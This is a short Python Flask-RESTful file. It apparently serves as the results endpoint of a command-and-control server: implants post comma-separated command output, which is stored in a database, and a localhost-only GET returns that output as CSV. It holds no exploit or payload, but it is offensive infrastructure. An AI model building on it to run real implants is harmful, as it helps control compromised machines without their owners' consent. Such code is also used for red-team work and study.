#TODO

from flask import request
from flask_restful import Resource
from database.dbconnection import get_db_connection

class results(Resource):

    def get(self):

        try:
            if request.remote_addr != '127.0.0.1':
                return {"Error": "Access denied"}, 403

            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT implant_id,created,result FROM results")
            rows = cursor.fetchall()

            csv_string = ""

            if rows:
                for row in rows:
                    csv_string += ",".join(map(str, row)) + "\n"

            conn.close()
            return csv_string, 200


        except Exception as e:
            return {"Error": str(e)}, 500

    def post(self):

        try:

            data = request.get_data().decode().split(',')
            implant_id = data[0]
            result = data[1]
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("INSERT INTO results (implant_id, result) VALUES (?, ?)", (implant_id, result))
            conn.commit()
            conn.close()
            return "Result added", 201

        except Exception as e:
            return {"Error": str(e)}, 500